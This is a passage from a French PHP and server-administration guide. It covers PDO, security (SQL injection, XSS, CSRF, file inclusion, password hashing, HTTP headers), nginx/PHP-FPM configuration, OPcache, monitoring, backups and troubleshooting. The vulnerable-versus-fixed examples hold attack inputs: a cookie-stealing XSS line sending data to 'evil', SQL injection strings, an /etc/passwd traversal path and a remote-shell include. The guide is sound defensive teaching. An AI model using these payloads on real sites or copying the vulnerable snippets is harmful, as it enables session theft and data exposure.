}

// --- Vérifier qu'on n'est pas déjà en transaction (code imbriqué) ---
if (!$pdo->inTransaction()) {
    $pdo->beginTransaction();
}
```

**Quand :** dès que **2+ écritures** dépendent l'une de l'autre. Sans transaction : panne entre les deux = données incohérentes (intervention clôturée sans rapport).

---

## 47. PDO — erreurs, timeouts, bonnes pratiques

```php
<?php declare(strict_types=1);

// --- DSN avec timeout de connexion (évite les workers FPM bloqués) ---
$dsn = 'mysql:host=127.0.0.1;port=3306;dbname=appli;charset=utf8mb4;connect_timeout=5';

// --- Attraper précisément ---
try {
    $stmt = $pdo->prepare('INSERT INTO equipements (reference) VALUES (:ref)');
    $stmt->execute(['ref' => $ref]);
} catch (PDOException $e) {
    // 23000 = violation de contrainte (doublon UNIQUE, clé étrangère...)
    if ($e->getCode() === '23000') {
        http_response_code(409);
        echo "Cette référence existe déjà.";
    } else {
        error_log("PDO : " . $e->getMessage()); // log complet côté serveur
        http_response_code(500);
        echo "Erreur base de données.";          // message générique côté client 🔒
    }
}

// --- LIKE avec paramètre : le % est dans la VALEUR, pas dans la requête ---
$stmt = $pdo->prepare('SELECT * FROM equipements WHERE reference LIKE :rech');
$stmt->execute(['rech' => '%' . $recherche . '%']);

// --- IN (...) avec un nombre variable de valeurs ---
$ids = [3, 7, 12];
$placeholders = implode(',', array_fill(0, count($ids), '?')); // "?,?,?"
$stmt = $pdo->prepare("SELECT * FROM equipements WHERE id IN ($placeholders)");
$stmt->execute($ids); // ✅ les placeholders sont générés par NOUS, les valeurs liées

// --- LIMIT/OFFSET : caster en int (ou bind en PARAM_INT) ---
$page = max(1, (int) ($_GET['page'] ?? 1));
$parPage = 20;
$stmt = $pdo->prepare('SELECT * FROM interventions ORDER BY id DESC LIMIT :lim OFFSET :off');
$stmt->bindValue(':lim', $parPage, PDO::PARAM_INT);
$stmt->bindValue(':off', ($page - 1) * $parPage, PDO::PARAM_INT);
$stmt->execute();
```

⚠️ **À bannir :** `"SELECT * FROM t WHERE id = $id"` (interpolation), `PDO::query()` avec des variables, `ATTR_EMULATE_PREPARES => true` en prod.

---

## 48. Sécurité : injections SQL — le dossier complet

```php
<?php declare(strict_types=1);

// --- ❌ VULNÉRABLE : concaténation ---
$id = $_GET['id']; // attaquant : 1 OR 1=1
$result = $pdo->query("SELECT * FROM users WHERE id = $id"); // dump complet !

// --- ✅ CORRIGÉ : requête préparée ---
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
$stmt->execute([(int) $id]);

// --- ❌ VULNÉRABLE : ORDER BY injectable (ne peut pas être un paramètre lié) ---
$tri = $_GET['tri']; // attaquant : (SELECT password FROM users)
$result = $pdo->query("SELECT * FROM logs ORDER BY $tri");

// --- ✅ CORRIGÉ : whitelist stricte ---
$colonnesAutorisees = ['date', 'niveau', 'message'];
$tri = $_GET['tri'] ?? 'date';
if (!in_array($tri, $colonnesAutorisees, true)) {
    $tri = 'date';
}
$sens = ($_GET['sens'] ?? 'asc') === 'desc' ? 'DESC' : 'ASC';
$stmt = $pdo->query("SELECT * FROM logs ORDER BY $tri $sens"); // $tri/$sens = valeurs sûres (nous)

// --- ❌ VULNÉRABLE : nom de table dynamique ---
$table = $_GET['table'];
$pdo->query("SELECT * FROM $table");

// --- ✅ CORRIGÉ : whitelist de tables ---
$tables = ['interventions' => true, 'equipements' => true];
$table = $_GET['table'] ?? 'interventions';
if (!isset($tables[$table])) { $table = 'interventions'; }
```

**Règle universelle :** tout ce qui est **structure SQL** (table, colonne, ASC/DESC) → **whitelist**. Tout ce qui est **donnée** → **paramètre lié**. Aucune exception.

---

## 49. Sécurité : XSS — échapper en sortie

```php
<?php declare(strict_types=1);

// --- ❌ VULNÉRABLE : affichage brut ---
echo $_POST['commentaire']; // attaquant : <script>fetch('https://evil/?c='+document.cookie)</script>

// --- ✅ CORRIGÉ : htmlspecialchars systématique ---
function e(string $s): string  // helper d'échappement (comme dans Laravel/Blade)
{
    return htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}
?>
<p><?= e($commentaire) ?></p>              <!-- <?= = echo, toujours avec e() -->
<a href="/user/<?= e($pseudo) ?>">profil</a>
<input value="<?= e($site) ?>">

<?php
// --- Contexte attribut avec guillemets : ENT_QUOTES couvre " et ' ---
// --- Contexte URL : valider le schéma ---
$url = $_POST['site_web'] ?? '';
if (!preg_match('#^https?://#', $url)) {
    $url = ''; // refuse javascript:, data:, etc.
}
?>
<a href="<?= e($url) ?>">site</a>

<?php
// --- Contexte JavaScript : json_encode (pas htmlspecialchars !) ---
?>
<script>
const config = <?= json_encode($config, JSON_HEX_TAG | JSON_HEX_AMP | JSON_UNESCAPED_UNICODE) ?>;
</script>

<?php
// --- HTML riche (WYSIWYG) : purifier avec une lib (HTML Purifier), jamais strip_tags seul ---
// composer require ezyang/htmlpurifier
$purifier = new HTMLPurifier(HTMLPurifier_Config::createDefault());
$htmlPropre = $purifier->purify($htmlSaisi);
```

| Contexte de sortie | Protection |
|---|---|
| HTML texte / attribut | `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` |
| URL (`href`, `src`) | Whitelist schéma `https?://` + `htmlspecialchars` |
| JavaScript | `json_encode` avec flags `JSON_HEX_*` |
| HTML riche voulu | HTML Purifier (lib) |
| E-mail / CSV | Échapper selon le format (CSV : guillemets doublés) |

🔒 Avec `HttpOnly` sur les cookies de session (section 42), même une XSS résiduelle ne vole pas la session — **défense en profondeur**.

---

## 50. Sécurité : CSRF — les tokens

**Attaque :** un site malveillant fait soumettre à ton navigateur un formulaire vers ton appli (où tu es connecté) : `<img src="https://ton-appli/supprimer?id=42">`. Le navigateur envoie tes cookies → action exécutée à ton insu.

**Défense :** token secret par session, vérifié à chaque POST.

```php
<?php declare(strict_types=1);
session_start();

// --- Génération (une fois par session) ---
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // 256 bits, random_int-grade
}

function csrfChamp(): string
{
    $token = htmlspecialchars($_SESSION['csrf_token'], ENT_QUOTES, 'UTF-8');
    return '<input type="hidden" name="csrf_token" value="' . $token . '">';
}

// --- Vérification (en tête de chaque traitement POST) ---
function verifierCsrf(): void
{
    $recu = $_POST['csrf_token'] ?? '';
    $attendu = $_SESSION['csrf_token'] ?? '';
    if ($attendu === '' || !hash_equals($attendu, $recu)) {
        http_response_code(403);
        exit('Jeton CSRF invalide.');
    }
}

// --- Usage ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    verifierCsrf(); // D'ABORD
    // ... traitement ...
}
?>
<form method="post">
    <?= csrfChamp() ?>
    <!-- champs -->
</form>
```

**Compléments :** `SameSite=Lax` sur les cookies (bloque l'envoi cross-site du cookie), actions destructrices **jamais en GET** (toujours POST + token), régénérer le token au login.


---

## 51. Sécurité : inclusion de fichiers (LFI/RFI)

```php
<?php declare(strict_types=1);

// --- ❌ LFI CLASSIQUE : page.php?page=../../etc/passwd ---
include $_GET['page'] . '.php'; // l'attaquant remonte l'arborescence

// --- ❌ RFI : allow_url_include=On + include http://evil/shell ---
// => exécution de code distant. (Heureusement désactivé par défaut depuis PHP 5.2,
// mais vérifie : allow_url_include=Off dans php.ini.)

// --- ✅ CORRIGÉ : whitelist de pages ---
$pagesAutorisees = [
    'accueil'       => __DIR__ . '/pages/accueil.php',
    'interventions' => __DIR__ . '/pages/interventions.php',
    'contact'       => __DIR__ . '/pages/contact.php',
];
$page = $_GET['page'] ?? 'accueil';
if (!isset($pagesAutorisees[$page])) {
    http_response_code(404);
    exit('Page introuvable.');
}
include $pagesAutorisees[$page]; // chemin 100 % contrôlé par nous

// --- ✅ Fichier par ID : basename + dossier fixe + vérification realpath ---
$fichier = basename($_GET['fichier'] ?? ''); // supprime tout chemin (../../ neutralisé)
$chemin = realpath(__DIR__ . '/documents/' . $fichier);
$base = realpath(__DIR__ . '/documents');
if ($chemin === false || !str_starts_with($chemin, $base)) {
    http_response_code(404);
    exit();
}
// $chemin est garanti dans /documents
```

**Règles :** jamais d'input utilisateur dans `include/require`, whitelist ou `basename`+`realpath`, `allow_url_include=Off` (vérifié), `open_basedir` en dernier rempart (voir section 62).

---

## 52. Sécurité : exposition d'erreurs en production

```php
<?php
// --- ❌ EN PROD : l'attaquant lit les chemins, versions, requêtes SQL ---
// display_errors = On  →  "Fatal error: Uncaught PDOException: SQLSTATE[HY000] ... in /var/www/appli/src/Db.php on line 42"

// --- ✅ php.ini prod (rappel) ---
// display_errors = Off
// display_startup_errors = Off
// log_errors = On

// --- ✅ Page d'erreur générique + ID de corrélation (voir section 34) ---
// L'utilisateur voit : "Erreur interne — Référence : a3f9c1"
// Toi tu cherches dans les logs : grep "a3f9c1" /var/log/php-fpm-error.log

// --- ❌ Stack trace dans une API : même combat ---
// header('Content-Type: application/json');
// echo json_encode(['erreur' => $e->getMessage()]); // ❌ fuit le SQL/la structure
// --- ✅ ---
http_response_code(500);
header('Content-Type: application/json');
echo json_encode(['erreur' => 'Erreur interne', 'reference' => $id]); // générique + traçable
```

📋 **Audit express :** `grep -rn "display_errors" /etc/php/*/fpm/php.ini` → `Off` partout ; `php -r 'phpinfo();'` jamais sur le web ; aucune `var_dump`/`print_r` oubliée (`grep -rn "var_dump" /var/www/appli/src`).

---

## 53. Sécurité : mots de passe — password_hash

```php
<?php declare(strict_types=1);

// --- ❌ À BANNIR : md5, sha1, sha256 simple (cassés en secondes par GPU) ---
// $hash = md5($password); // NON.

// --- ✅ Création : bcrypt (défaut) ou Argon2id ---
$hash = password_hash($motDePasse, PASSWORD_DEFAULT);
// PASSWORD_DEFAULT = bcrypt aujourd'hui, évoluera (PHP gère la compatibilité)
// Explicite : password_hash($mdp, PASSWORD_ARGON2ID, ['memory_cost' => 65536, 'time_cost' => 4, 'threads' => 2]);

// Stockage : colonne VARCHAR(255) (les algo évoluent, la taille aussi)

// --- ✅ Vérification ---
if (password_verify($motDePasseSaisi, $hashStocke)) {
    // OK — password_verify est en temps constant (anti timing attack)
    // --- Re-hachage si l'algo/coût a évolué ---
    if (password_needs_rehash($hashStocke, PASSWORD_DEFAULT)) {
        $nouveauHash = password_hash($motDePasseSaisi, PASSWORD_DEFAULT);
        // UPDATE users SET hash = ... WHERE id = ...
    }
    login($userId);
} else {
    // Message GÉNÉRIQUE : "Identifiants invalides." (ne pas dire si c'est le login ou le mdp)
    // + délai/rate-limit anti brute-force (voir plus bas)
}

// --- Politique de mot de passe : longueur > complexité ---
// Minimum 12 caractères. Vérifier contre une liste de mdp compromis (haveibeenpwned API k-anonymity)
// ou au minimum une petite liste locale de mots interdits :
$interdits = ['password', 'azerty123', 'entreprise2024'];
if (mb_strlen($mdp) < 12 || in_array(mb_strtolower($mdp), $interdits, true)) {
    $erreurs[] = 'Mot de passe trop faible (12 caractères minimum).';
}

// --- Anti brute-force : compteur en BDD/Redis ---
// Après 5 échecs sur un compte : verrouiller 15 min. Après 20 échecs sur une IP : bannir 1h (fail2ban).
```

---

## 54. Sécurité : en-têtes HTTP (à poser côté nginx)

La sécurité se joue aussi dans les en-têtes. À configurer dans nginx (section 56) :

```nginx
# --- nginx : security headers ---
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;          # anti-clickjacking
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
# HSTS : une fois le HTTPS validé et stable
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

# Content-Security-Policy : la plus puissante (à ajuster selon l'appli)
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'self'" always;
```

Vérification : `curl -sI https://ton-site.fr | grep -i "^x-\|^content-security\|^strict"`.

Côté PHP, forcer le HTTPS :

```php
<?php declare(strict_types=1);
// En tête du bootstrap : redirige tout le HTTP vers HTTPS
if (($_SERVER['HTTPS'] ?? 'off') !== 'on' && ($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') !== 'https') {
    header('Location: https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], true, 301);
    exit;
}
```

---

## 55. Checklist sécurité — l'audit en 15 minutes

📋 **À passer sur chaque appli hébergée :**

**Configuration serveur**
- [ ] `display_errors=Off`, `expose_php=Off`, `allow_url_include=Off`
- [ ] PHP et extensions à jour (`apt upgrade`, `composer audit`)
- [ ] `.env` / `config.php` hors racine web, droits `0600`
- [ ] `vendor/`, `.git/` non accessibles par le web (règle nginx `deny all`)
- [ ] HTTPS partout + HSTS, cookies `Secure`

**Code**
- [ ] 100 % des requêtes SQL en **préparées** (`grep -n "query(\"" src/` → vérifier chacune)
- [ ] 100 % des affichages via `e()` / `htmlspecialchars`
- [ ] Token CSRF sur tous les formulaires POST
- [ ] `password_hash` / `password_verify` (aucun md5/sha1)
- [ ] Uploads : whitelist MIME + nom généré + hors racine web
- [ ] Aucun `include` avec variable non whitelistée
- [ ] `random_int`/`random_bytes` pour les tokens (pas `rand`/`uniqid` seul)

**Exploitation**
- [ ] Logs d'erreurs centralisés et surveillés
- [ ] Sauvegardes code + BDD testées (restauration essayée !)
- [ ] fail2ban sur les 403/404 suspects et les échecs login
- [ ] Comptes admin : 2FA si l'appli le permet, mots de passe forts

---

## 56. nginx + PHP-FPM — configuration complète

```nginx
# /etc/nginx/sites-available/appli.conf
server {
    listen 80;
    server_name appli.entreprise.fr;
    return 301 https://$host$request_uri;  # tout en HTTPS
}

server {
    listen 443 ssl;
    server_name appli.entreprise.fr;

    ssl_certificate     /etc/letsencrypt/live/appli.entreprise.fr/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/appli.entreprise.fr/privkey.pem;
    # (certbot --nginx pour générer)

    root /var/www/appli/public;   # 🔒 SEUL public/ est exposé (index.php dedans)
    index index.php;

    # --- Security headers (section 54) ---
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # --- Bloquer l'accès aux sensibles ---
    location ~ /\. { deny all; }                        # .git, .env
    location ~* \.(env|log|sql|bak|old)$ { deny all; }

    # --- PHP via FPM (socket Unix) ---
    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        try_files $uri =404;                           # 🔒 anti path-info (fichier.php/nimporte-quoi)
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        fastcgi_param HTTPS on;
        fastcgi_pass unix:/run/php/php8.4-fpm-appli.sock;  # socket DÉDIÉE par site (section 57)
        fastcgi_read_timeout 60s;
    }

    # --- Fichiers statiques : cache agressif ---
    location ~* \.(css|js|png|jpg|webp|woff2)$ {
        expires 30d;
        add_header Cache-Control "public, immutable";
    }

    access_log /var/log/nginx/appli-access.log;
    error_log  /var/log/nginx/appli-error.log;
}
```

```bash
sudo ln -s /etc/nginx/sites-available/appli.conf /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```

🔒 **Points critiques :** `root` sur `public/` uniquement, `try_files $uri =404` dans le bloc PHP (sinon exécution de fichiers uploadés via path-info), socket par site, `.env`/`.git` bloqués.

---

## 57. Pools PHP-FPM par site — isolation

**Un pool = un site = un utilisateur système.** Si un site est compromis, l'attaquant n'accède pas aux fichiers des autres.

```bash
# Créer l'utilisateur dédié (sans shell, sans home inscriptible)
sudo useradd --system --no-create-home --shell /usr/sbin/nologin appli
sudo mkdir -p /var/www/appli
sudo chown -R appli:www-data /var/www/appli
sudo chmod -R 750 /var/www/appli
```

```ini
; /etc/php/8.4/fpm/pool.d/appli.conf
[appli]
user = appli
group = www-data

listen = /run/php/php8.4-fpm-appli.sock
listen.owner = www-data
listen.group = www-data
listen.mode = 0660

; --- Gestion des processus : dynamic = le bon compromis ---
pm = dynamic
pm.max_children = 20        ; plafond de workers (RAM : 20 x 60 Mo ≈ 1,2 Go)
pm.start_servers = 4
pm.min_spare_servers = 2
pm.max_spare_servers = 6
pm.max_requests = 500       ; recycle chaque worker après 500 requêtes (anti-fuite mémoire)

; --- Logs dédiés ---
php_admin_value[error_log] = /var/log/php-fpm-appli-error.log
php_admin_flag[log_errors] = on

; --- Durcissement par pool (php_admin_value = non surchargeable par l'appli) ---
php_admin_value[open_basedir] = /var/www/appli:/tmp
php_admin_value[upload_tmp_dir] = /var/www/appli/tmp
php_admin_value[session.save_path] = /var/www/appli/sessions
php_admin_value[disable_functions] = exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec
; ⚠️ disable_functions : à ajuster — certaines applis (backups, conversions) ont besoin d'exec.

; --- Status / ping (supervision, section 61) ---
pm.status_path = /fpm-status-appli
ping.path = /fpm-ping-appli
ping.response = pong
```

```bash
sudo systemctl reload php8.4-fpm
```

**Dimensionnement `pm.max_children` :** `RAM_disponible_pour_PHP / mémoire_moyenne_par_worker`. Mesure la mémoire réelle : `ps --sort=-rss -o rss,command -C php-fpm8.4 | awk '{sum+=$1} END {print sum/NR/1024 " Mo/worker"}'`.

| Profil | pm | Quand |
|---|---|---|
| `ondemand` | workers créés à la demande | Faible trafic, économie RAM (démarrage à froid) |
| `dynamic` | min/max spare | **Standard** : la plupart des applis |
| `static` | N workers fixes | Fort trafic constant, latence minimale |

---

## 58. OPcache — le turbo gratuit

OPcache compile chaque script PHP **une fois** et garde le bytecode en mémoire partagée. Gain typique : **2 à 5x** sur le temps de réponse. Activé par défaut, mais à régler :

```ini
; /etc/php/8.4/fpm/conf.d/10-opcache.ini (ou dans php.ini)
opcache.enable = 1
opcache.enable_cli = 0              ; CLI : inutile (processus éphémères), 1 pour les longs workers
opcache.memory_consumption = 256    ; Mo de SHM (128-512 selon taille du code)
opcache.interned_strings_buffer = 16
opcache.max_accelerated_files = 20000 ; > nombre de fichiers PHP (compter : find /var/www -name "*.php" | wc -l)
opcache.validate_timestamps = 0     ; 🔒 PROD : 0 = ne jamais revérifier les fichiers (perf max)
opcache.revalidate_freq = 0         ; ignoré si validate_timestamps=0
opcache.save_comments = 1           ; requis par certaines libs (annotations)
opcache.jit = 1255                  ; PHP 8 : JIT tracing, 1255 = recommandé
opcache.jit_buffer_size = 128M
```

⚠️ **`validate_timestamps=0` en prod** = après chaque déploiement, il faut **vider l'OPcache** (sinon l'ancien code reste servi !) :

```php
<?php // deploy-reset-opcache.php — protégé, usage ponctuel
// opcache_reset() ne vide que le cache du... : attention, en FPM chaque pool a son cache.
// La méthode fiable : reload gracieux de PHP-FPM après déploiement :
// sudo systemctl reload php8.4-fpm
```

**Procédure de déploiement sûre :**

```bash
# 1. Déployer le code
# 2. Vider l'opcache de chaque pool :
sudo systemctl reload php8.4-fpm   # recharge workers + vide OPcache
# 3. Vérifier :
curl -s https://appli.entreprise.fr/ | head -5
```

**Monitoring OPcache** (via `opcache_get_status()` dans un script admin protégé, ou `php -r`) :

```php
$st = opcache_get_status();
echo "Hit rate : " . round($st['opcache_statistics']['opcache_hit_rate'], 2) . " %\n";
echo "Mémoire utilisée : " . round($st['memory_usage']['used_memory'] / 1024 / 1024) . " Mo\n";
echo "Clés : {$st['opcache_statistics']['num_cached_keys']} / {$st['opcache_statistics']['max_cached_keys']}\n";
// Hit rate < 95 % ou clés saturées → augmenter memory_consumption / max_accelerated_files
```

---

## 59. Réglages performance FPM — le calcul

Formule de base pour `pm.max_children` :

```
max_children = (RAM_totale - RAM_OS - RAM_BDD - marge) / RAM_par_worker_PHP
```

Exemple concret — serveur 8 Go, MariaDB 2 Go, OS 1 Go, marge 1 Go → 4 Go pour PHP ; worker moyen 60 Mo → `max_children ≈ 65` répartis sur les pools.

```bash
# Mesurer la mémoire réelle d'un worker (en Mo)
ps -o rss= -C php-fpm8.4 | awk '{s+=$1; n++} END {printf "%.0f Mo/worker (%d workers)\n", s/n/1024, n}'

# Voir les workers par pool
ps aux | grep "php-fpm: pool" | awk '{print $11, $12, $6/1024 " Mo"}' | head -20
```

Autres leviers :

| Levier | Effet |
|---|---|
| `pm.max_requests = 500` | Recycle les workers → contient les fuites mémoire lentes |
| OPcache `validate_timestamps=0` | -5 à -15 % de latence |
| Socket Unix vs TCP | Socket Unix = plus rapide en local (pas de stack TCP) |
| `realpath_cache_size = 4096k` + `realpath_cache_ttl = 600` (php.ini) | Moins de `stat()` disque |
| nginx `fastcgi_cache` | Cache pleine page pour le contenu public (sections non connectées) |
| Redis : sessions + cache appli | Décharge la BDD |

---

## 60. Supervision : les logs — où, quoi, comment

| Log | Chemin | Contenu |
|---|---|---|
| Erreurs PHP (pool) | `/var/log/php-fpm-appli-error.log` | Fatal, warnings, `error_log()` |
| Erreurs FPM globales | `/var/log/php8.4-fpm.log` | Démarrage pools, workers tués |
| Slow log | `/var/log/php-fpm-appli-slow.log` | Requêtes > N secondes (voir ci-dessous) |
| Accès nginx | `/var/log/nginx/appli-access.log` | Chaque requête HTTP |
| Erreurs nginx | `/var/log/nginx/appli-error.log` | Timeouts FPM, 502... |

```ini
; pool.d/appli.conf — slow log : détecte les requêtes qui rament
request_slowlog_timeout = 5s
slowlog = /var/log/php-fpm-appli-slow.log
; Toute requête > 5 s = stack trace PHP dans le slow log → identifie la fonction fautive
```

```bash
# Surveillance temps réel
tail -f /var/log/php-fpm-appli-error.log

# Top des erreurs du jour
grep "$(date +%Y-%m-%d)" /var/log/php-fpm-appli-error.log | cut -d']' -f2- | sort | uniq -c | sort -rn | head

# Corréler nginx 502 ↔ FPM : même fenêtre temporelle
grep " 502 " /var/log/nginx/appli-access.log | tail -5
grep -E "WARNING|ERROR" /var/log/php8.4-fpm.log | tail -5

# Rotation : logrotate est préconfiguré pour php-fpm sur Debian — vérifier :
cat /etc/logrotate.d/php8.4-fpm
```

🔒 **Logs = données sensibles potentielles** (e-mails, traces SQL) : droits `640`, propriétaire `appli:adm`, jamais exposés par le web, rotation active, rétention 30-90 jours selon besoin.

---

## 61. Supervision : status FPM, ping, métriques

```ini
; pool.d/appli.conf (déjà vu section 57)
pm.status_path = /fpm-status-appli
ping.path = /fpm-ping-appli
```

```nginx
# nginx : exposer le status UNIQUEMENT en local (jamais au public !)
location ~ ^/(fpm-status-appli|fpm-ping-appli)$ {
    allow 127.0.0.1;
    allow 10.0.0.0/8;      # ton réseau de supervision
    deny all;
    include fastcgi_params;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_pass unix:/run/php/php8.4-fpm-appli.sock;
}
```

```bash
# Ping : le pool répond ?
curl -s http://127.0.0.1/fpm-ping-appli
# pong

# Status : état des workers (format texte ou ?json)
curl -s "http://127.0.0.1/fpm-status-appli?json" | python3 -m json.tool
```

Exemple de sortie (`?json`) :

```json
{
    "pool": "appli",
    "process manager": "dynamic",
    "start time": 1727222400,
    "accepted conn": 15230,
    "listen queue": 0,
    "max listen queue": 4,
    "idle processes": 3,
    "active processes": 2,
    "total processes": 5,
    "max active processes": 18,
    "max children reached": 0
}
```

**Alertes à poser (Zabbix/Prometheus/node_exporter ou script cron) :**

| Métrique | Seuil d'alerte |
|---|---|
| `max children reached` = 1 | ⚠️ pool saturé → augmenter `max_children` ou chercher la lenteur |
| `listen queue` > 0 durable | requêtes en attente → sous-dimensionné |
| `slow requests` croissant | code ou BDD qui rame |
| ping ≠ `pong` | pool HS → redémarrer + alerter |

Script de check minimal (cron toutes les 5 min) :

```bash
#!/bin/bash
# /usr/local/bin/check-fpm.sh
for pool in appli intranet; do
  rep=$(curl -sm 5 "http://127.0.0.1/fpm-ping-$pool")
  [ "$rep" = "pong" ] || echo "ALERTE : pool FPM $pool ne répond pas" | mail -s "FPM $pool HS" astreinte@entreprise.fr
done
```

---

## 62. Durcissement : open_basedir et disable_functions

Deux remparts **par pool** (section 57), non contournables par l'appli (`php_admin_value`) :

```ini
; --- open_basedir : PHP ne peut ouvrir des fichiers QUE dans ces dossiers ---
php_admin_value[open_basedir] = /var/www/appli:/tmp:/usr/share/php
; Effet : file_get_contents('/etc/passwd') → Warning "open_basedir restriction in effect"
; ⚠️ Inclure tous les chemins légitimes (vendor, sessions, tmp, uploads) sinon l'appli casse.
; Tester après activation : parcourir les fonctions critiques de l'appli.

; --- disable_functions : désactive les exécutions shell ---
php_admin_value[disable_functions] = exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,show_source,phpinfo
; ⚠️ Certaines applis en ont besoin (ex. : génération PDF via binaire, backups).
; Alternative : les autoriser mais auditer chaque appel dans le code.
```

**Test d'efficacité** (après activation, en CLI avec la conf du pool ou via une page de test **temporaire et protégée**) :

```php
<?php
var_dump(@file_get_contents('/etc/passwd')); // doit échouer (open_basedir)
var_dump(function_exists('exec') && @exec('id')); // exec désactivée
```

🔒 Ces deux réglages ne remplacent **pas** la correction du code (injections, uploads) : ce sont des **filets**, pas des murs. Un attaquant qui uploade un shell reste bloqué hors de `/etc`, mais le shell tourne quand même dans le pool.


---

## 63. Sauvegarde — code + base de données

On ne sauvegarde pas « le serveur », on sauvegarde de quoi **reconstruire** : code versionné + dump BDD + fichiers utilisateurs + configs.

```bash
#!/bin/bash
# /usr/local/bin/backup-appli.sh — à lancer en cron (utilisateur dédié "backup")
set -euo pipefail
DATE=$(date +%Y%m%d-%H%M)
DEST=/srv/backups/appli
mkdir -p "$DEST"

# 1. Base de données (MariaDB) — transactionnel, sans verrou global
mysqldump --single-transaction --quick --routines --triggers \
  -u backup -p"$DB_BACKUP_PASS" appli | gzip > "$DEST/appli-bdd-$DATE.sql.gz"

# 2. Fichiers utilisateurs (uploads) — hors git par nature
tar -czf "$DEST/appli-uploads-$DATE.tar.gz" -C /var/www/appli uploads/

# 3. Code : le git fait foi — on archive le commit déployé (traçabilité)
git -C /var/www/appli rev-parse HEAD > "$DEST/appli-commit-$DATE.txt"

# 4. Configs (nginx, pools FPM, php.ini)
tar -czf "$DEST/appli-configs-$DATE.tar.gz" \
  /etc/nginx/sites-available/appli.conf \
  /etc/php/8.4/fpm/pool.d/appli.conf

# 5. Rétention : 7 jours glissants
find "$DEST" -type f -mtime +7 -delete

# 6. Test d'intégrité du dump (corrompu = inutile)
gzip -t "$DEST/appli-bdd-$DATE.sql.gz" && echo "dump OK"
```

```bash
# Cron : tous les jours à 2h
0 2 * * * /usr/local/bin/backup-appli.sh >> /var/log/backup-appli.log 2>&1
```

**Restauration BDD (à TESTER au moins une fois par trimestre sur un serveur de test) :**

```bash
zcat /srv/backups/appli/appli-bdd-20261005-0200.sql.gz | mysql -u root -p appli_restauree
```

📋 **Checklist sauvegarde :** BDD (`--single-transaction`), uploads, configs, commit git tracé, chiffrement si offsite, **test de restauration réel** (un backup non testé = pas de backup), alerte si le cron échoue (log + monitoring du fichier le plus récent).

---

## 64. Dépannage — méthode générale

```
1. REPRODUIRE : quelle URL/action exacte ? quel utilisateur ? quelle heure ?
2. LIRE LES LOGS (dans cet ordre) :
   a. /var/log/nginx/appli-error.log      → 502 ? timeout ? (le symptôme HTTP)
   b. /var/log/php-fpm-appli-error.log    → fatal/warning PHP (la cause code)
   c. /var/log/php8.4-fpm.log             → pool saturé ? workers tués ?
   d. slow log                            → quelle fonction rame ?
   e. logs MariaDB / appli                → cause BDD/métier
3. ISOLER : staging ? un seul pool ? après un déploiement ? (git log)
4. CORRIGER → tester → déployer → SURVEILLER les logs 15 min
```

```bash
# Kit de survie : statut des services
systemctl is-active php8.4-fpm nginx mariadb
# File d'attente FPM (si > 0 durable → saturation)
curl -s "http://127.0.0.1/fpm-status-appli?json" | grep -E "listen queue|active processes|max children"
# Processus qui consomment
ps --sort=-rss -o pid,rss,command -C php-fpm8.4 | head
# Espace disque (1re cause des "ça marchait hier")
df -h / /var /tmp
# Inodes (un disque plein à 30 % mais 100 % d'inodes = même effet)
df -i /var
```

---

## 65. Dépannage — cas concret n°1 : erreur 502 Bad Gateway

**Symptômes :** nginx répond 502 sur les pages PHP, le HTML statique marche.

| Cause | Diagnostic | Remède |
|---|---|---|
| FPM arrêté | `systemctl is-active php8.4-fpm` → `inactive` | `systemctl start php8.4-fpm`, chercher pourquoi (OOM ? `dmesg \| grep -i oom`) |
| Mauvais socket | `connect() to unix:/run/php/...sock failed (2: No such file)` dans nginx error log | Aligner `fastcgi_pass` nginx ↔ `listen` du pool |
| Permissions socket | `(13: Permission denied)` | `listen.owner/group/mode` : www-data doit lire/écrire |
| Pool saturé | `max children reached` dans php8.4-fpm.log | Augmenter `max_children` (si RAM) ou traiter la lenteur (slow log) |
| Fatal PHP au démarrage du worker | Erreur dans php-fpm-appli-error.log | Corriger le code (souvent après déploiement → rollback) |

```bash
# Vérifier que le socket existe et qui peut l'utiliser
ls -l /run/php/php8.4-fpm-appli.sock
# Tester FPM directement (bypass nginx)
SCRIPT_NAME=/fpm-ping-appli SCRIPT_FILENAME=/fpm-ping-appli \
  cgi-fcgi -bind -connect /run/php/php8.4-fpm-appli.sock  # doit répondre "pong"
```

---

## 66. Dépannage — cas concret n°2 : page blanche (WSOD)

**Symptômes :** HTTP 200 mais page vide, ou 500 sans message (prod : `display_errors=Off`, c'est normal).

```bash
# 1. Le log PHP du pool dit tout :
tail -30 /var/log/php-fpm-appli-error.log
# Exemples typiques :
# "PHP Fatal error: Uncaught Error: Class 'App\\Sonde' not found" → autoload (composer dump-autoload)
# "PHP Parse error: syntax error, unexpected '=>' " → code PHP 8 sur... non, ici c'est l'inverse :
#    code écrit pour PHP 8.4 déployé sur 8.1 → vérifier php -v vs code
# "Allowed memory size of 268435456 bytes exhausted" → memory_limit trop bas OU boucle infinie

# 2. Reproduire en CLI (même code, erreurs visibles) :
sudo -u appli php /var/www/appli/public/index.php
# ⚠️ attention : le CLI n'a pas les mêmes ini ni les mêmes variables ($_SERVER vide)

# 3. Vérifier l'OPcache après déploiement :
